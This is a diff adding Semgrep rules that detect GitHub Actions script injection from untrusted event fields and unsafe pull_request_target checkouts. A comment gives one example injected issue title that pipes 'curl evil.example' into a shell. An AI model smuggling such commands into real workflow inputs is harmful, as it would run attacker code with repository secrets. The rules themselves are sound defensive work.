@@ -1,0 +1,95 @@
+# LOCAL rules for GitHub Actions workflows (.github/workflows/*.yml|yaml).
+#
+# Every rule is limited to .github/workflows/ with `paths:`, so semgrep
+# never parses other YAML (a Helm template it cannot parse would make the
+# Semgrep row PARTIAL). Every finding of a local rule blocks the gate.
+
+rules:
+  # ${{ }} is pasted into the script text before the shell runs it, so an
+  # issue title such as  a"; curl evil.example | sh; echo "  becomes code.
+  # Only the fields someone without write access sets as free text are
+  # flagged (the untrusted inputs GitHub's security guide lists):
+  #   github.head_ref
+  #   github.event.issue / discussion .title .body
+  #   github.event.pull_request .title .body .head.ref .head.label
+  #     .head.repo.default_branch
+  #   github.event.comment / review / review_comment .body
+  #   github.event.head_commit .message .author.name .author.email
+  #   github.event.commits[*] .message .author.name .author.email
+  #   github.event.pages[*].page_name
+  #   github.event.workflow_run .head_branch .display_title
+  #     .head_commit.message .head_commit.author.name .head_commit.author.email
+  # Not flagged: every other field (numbers, hashes, repository names,
+  # logins, the event's action, github.event.inputs), and a whole object
+  # passed through toJSON().
+  - id: github-actions-script-injection
+    languages: [yaml]
+    severity: ERROR
+    message: >
+      A value an outsider controls (an issue or pull request title or body,
+      a branch name, a commit message) is pasted into a run: script by
+      ${{ }} before the shell sees it: whoever writes that text runs
+      commands in the workflow, with its token and secrets. Pass it through
+      env: (FOO: ${{ github.event.issue.title }}) and use "$FOO" in the
+      script.
+    paths:
+      include:
+        - ".github/workflows/*.yml"
+        - ".github/workflows/*.yaml"
+    # semgrep's YAML parser reads ${{ }} as an expression, so the script is
+    # matched as plain text (language: generic)
+    patterns:
+      - pattern-inside: "steps: [...]"
+      - pattern: "run: $SCRIPT"
+      - metavariable-pattern:
+          metavariable: $SCRIPT
+          language: generic
+          patterns:
+            - pattern-regex: \$\{\{[^}]*\bgithub\.(?:head_ref|event\.(?:(?:issue|discussion)\.(?:title|body)|pull_request\.(?:title|body|head\.(?:ref|label|repo\.default_branch))|(?:comment|review|review_comment)\.body|head_commit\.(?:message|author\.(?:name|email))|commits(?:\[[^\]]*\]|\.\*)\.(?:message|author\.(?:name|email))|pages(?:\[[^\]]*\]|\.\*)\.page_name|workflow_run\.(?:head_branch|display_title|head_commit\.(?:message|author\.(?:name|email)))))(?![A-Za-z0-9_])
+
+  # pull_request_target runs with the base repository's token and secrets;
+  # checking out the pull request's own code there runs a stranger's code
+  # with them.
+  - id: github-actions-pull-request-target-checkout
+    languages: [yaml]
+    severity: ERROR
+    message: >
+      A pull_request_target workflow checks out the pull request's code:
+      that code comes from whoever opened the pull request, and it runs with
+      the repository's secrets and write token. Use the pull_request event
+      for anything that builds or runs the contributed code.
+    paths:
+      include:
+        - ".github/workflows/*.yml"
+        - ".github/workflows/*.yaml"
+    patterns:
+      - pattern-either:
+          - pattern-inside: |
+              on:
+                ...
+                pull_request_target: ...
+                ...
+              ...
+          - pattern-inside: |
+              on: [..., pull_request_target, ...]
+              ...
+          - pattern-inside: |
+              on: pull_request_target
+              ...
+      - pattern-inside: |
+          jobs:
+            ...
+      - pattern: |
+          uses: $CHECKOUT
+          with:
+            ...
+            ref: $REF
+            ...
+      - metavariable-regex:
+          metavariable: $CHECKOUT
+          regex: ^actions/checkout@
+      - metavariable-pattern:
+          metavariable: $REF
+          language: generic
+          patterns:
+            - pattern-regex: (github\.event\.pull_request\.head|github\.head_ref|refs/pull/)
